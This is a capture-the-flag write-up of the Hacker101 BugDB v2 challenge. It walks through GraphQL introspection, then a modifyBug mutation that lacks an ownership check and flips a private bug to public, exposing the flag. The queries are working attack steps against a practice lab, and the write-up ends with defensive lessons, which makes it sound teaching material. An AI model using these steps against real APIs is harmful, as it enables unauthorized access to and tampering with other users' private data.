# BugDB v2 - Hacker101 CTF

**Hunter:** Abdulmuiz (marex02)  
**Platform:** Hacker101  
**Difficulty:** Easy  
**Flags:** 1/1   
**Vulnerabilities:** GraphQL Broken Object-Level Authorization (Write-side IDOR)

---

## Overview

BugDB v2 is the patched version of v1. The developer fixed the read-side vulnerability, private bugs no longer appear in `allBugs`, and the `Bugs_` type with the exposed `text` field was removed. But they only fixed what they could see: the read path. The write path, a mutation to modify bug data had no authorization check at all. Anyone could flip a private bug to public without owning it or even being logged in.


---

## Reconnaissance

Same interface as v1. I ran introspection immediately:

```graphql
{ __schema { types { name } } }
```

Comparing to v1, two things changed:
- **`Bugs_` was gone**, the secondary type that exposed the `text` field had been removed ✓
- **Two new types appeared:** `MyMutations` and `modifyBug`

> Mutations in GraphQL are write operations: creating, updating, or deleting data. The developer added the ability to modify bugs. My immediate question: **does `modifyBug` check who owns the bug before allowing changes?**

---

## Step 1 - Verifying the Read Fix

```graphql
{ allBugs { id text private } }
```

Only one bug returned, the public one. The private bug from v1 was completely invisible. Not just unreadable, gone from the list entirely.

The read-side fix was real. So I moved to the write side.

---

## Step 2 — Inspecting the Mutation

I checked what arguments `modifyBug` accepted:

```graphql
{ 
  __type(name: "MyMutations") { 
    fields { 
      name 
      args { 
        name 
        type { name } 
      } 
    } 
  } 
}
```

Three arguments:
- `id` (Int) - which bug to target
- `private` (Boolean) - whether the bug is private or not
- `text` (String) - the content of the bug

> **The `private` argument was the problem.** The API was allowing anyone to pass a bug ID and flip its `private` status from `true` to `false`. No ownership check. No authentication required.

[Mutation schema showing private argument](./screenshots/recon-mutation-schema.png)


---

## Step 3 - Flipping the Private Bug to Public

From v1, I knew the private bug had integer ID `2`. I sent the mutation:

```graphql
mutation { 
  modifyBug(id: 2, private: false) { 
    ok 
    bug { 
      id 
      text 
      private 
    } 
  } 
}
```

Response: **`ok: true`**

No error. No "you don't own this bug" message. The mutation ran without any authorization check.

[modifyBug mutation returning ok true](./screenshots/flag1-mutation-response.png)

---

## Step 4 - Reading the Flag

```graphql
{ allBugs { id text private } }
```

Both bugs now appeared. The previously private bug was showing as `private: false` with its `text` field fully visible.

**Flag was inside the `text` field.**

[allBugs after mutation showing flag in text field](./screenshots/flag1-allbugs-flag.png)

---

## Why It Worked

The developer fixed the read-side vulnerability from v1:
- Private bugs no longer appeared in `allBugs` ✓
- The `Bugs_` type was removed ✓

But they only thought about **reading**. The write side — `modifyBug` — had no authorization at all. Anyone could call it with any bug ID and change its visibility without owning it or being logged in.

> Fixing the ability to *read* private data does not automatically fix the ability to *modify* that same data. Both sides need their own authorization checks.

This is a very common mistake in security patches. You fix what the report says and miss the adjacent issue sitting right next to it.

---

## Vulnerability Summary

| v1 Fix | Status | v2 Issue |
|---|---|---|
| `Bugs_` type removed | ✓ Fixed | — |
| Private bugs hidden from `allBugs` | ✓ Fixed | — |
| `modifyBug` mutation authorization | ❌ Not implemented | Anyone can flip `private` to `false` |

---

## Key Takeaways

1. **Fixing a read vulnerability does not fix a write vulnerability.** Always test mutations separately from queries.
2. **When a mutation exposes fields like `private` or `admin` as arguments,** test whether ownership is verified before assuming it's protected.
3. **Think about what a patch *missed*, not just what it fixed.** Security patches are often incomplete they address the symptom, not the pattern.
4. **GraphQL error messages reveal valid field names** through "Did you mean...?" responses. Pay attention to them.

---

## Tools Used

| Tool | Purpose |
|---|---|
| GraphiQL | In-browser GraphQL query interface |
| Burp Suite | Request interception and analysis |
| Browser DevTools | Network inspection |
